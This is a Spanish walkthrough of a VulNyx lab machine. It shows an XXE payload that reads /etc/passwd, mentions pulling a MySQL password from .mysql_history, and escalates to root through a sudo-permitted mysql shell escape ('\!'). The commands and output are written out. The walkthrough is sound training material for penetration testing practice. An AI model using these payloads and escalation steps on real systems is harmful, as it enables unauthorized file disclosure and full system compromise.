### XML External Entity
Si vemos la solicitud HTTP que se realiza podemos fijarnos en la siguiente:

![](/assets/images/vulnyx/external/4.png)

Vemos que los datos se envían en XML. Esto es un posible vector de XXE. Vamos a probar a definir un nuevo DTD *(Document Type Definition)* donde definiremos una nueva entidad externa que use el esquema de URL `file://` para intentar reflejar el archivo en la respuesta del servidor:

*Payload*

```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
```

![](/assets/images/vulnyx/external/5.png)

Vemos que es vulnerable XML Externtal Entity (XXE). Si leemos el `passwd` podemos ver que existe el usuario `admin` en el sistema:

```
admin:x:1000:1000:admin,,,:/home/admin:/bin/bash
```

Si intentamos leer el `id_rsa` no lograremos nada con éxito. Tampoco conseguiremos nada leyendo el `.bash_history`. Pero si recordamos tiene el servicio `mysql` expuesto y es posible que no haya eliminado/limpiado el `.mysql_history` vamos a probarlo:

![](/assets/images/vulnyx/external/6.png)

## Shell as root

Vamos a ver los permisos SUDOERS del usuario `admin`:
```bash
admin@external:~$ sudo -l
Matching Defaults entries for admin on external:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User admin may run the following commands on external:
    (root) NOPASSWD: /usr/bin/mysql
```

Vemos que podemos iniciar una instancia mysql interactiva como el usuario `root`. Esto es crítico ya que podemos usar el comando `\!` que nos permitirá ejecutar comandos a nivel de sistema:

```bash
admin@external:~$ sudo /usr/bin/mysql -u root -p'r00tt00rDB' -e '\! id'
uid=0(root) gid=0(root) grupos=0(root)
```

Vamos a darnos una `bash`:

```bash
root@external:/home/admin# id;hostname -I
uid=0(root) gid=0(root) grupos=0(root)
10.0.2.17 
```
